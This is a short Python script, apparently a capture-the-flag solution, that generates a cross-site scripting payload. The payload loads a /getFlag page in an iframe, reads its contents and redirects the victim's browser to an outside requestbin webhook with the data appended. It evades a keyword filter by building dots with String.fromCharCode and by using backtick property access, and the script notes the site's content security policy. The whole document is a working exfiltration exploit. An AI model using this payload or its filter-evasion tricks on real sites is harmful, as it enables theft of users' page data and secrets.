
webhook = "https://requestbin.io/1hwg0h51"
webhook = webhook.replace(".", "`+String[`fromCharCode`](46)+`")

# fetch|XMLHttp|['".] Not allowed!
"""
CSP
Content-Security-Policy: default-src 'self';script-src 'self' 'unsafe-inline';base-uri 'self';block-all-mixed-content;font-src 'self' https: data:;form-action 'self';frame-ancestors 'self';img-src 'self' data:;object-src 'none';script-src-attr 'none';style-src 'self' https: 'unsafe-inline'
"""

payload = """
<script>
ifrm=document[`createElement`](`iframe`);
ifrm[`setAttribute`](`src`,`/getFlag`);
document[`body`][`appendChild`](ifrm);
ifrm[`onload`]=function(){document[`location`]=`%s`+`?f
lag=`+ifrm[`contentWindow`][`document`][`body`][`innerHTML`]}
</script>
""".strip() % webhook

print(payload)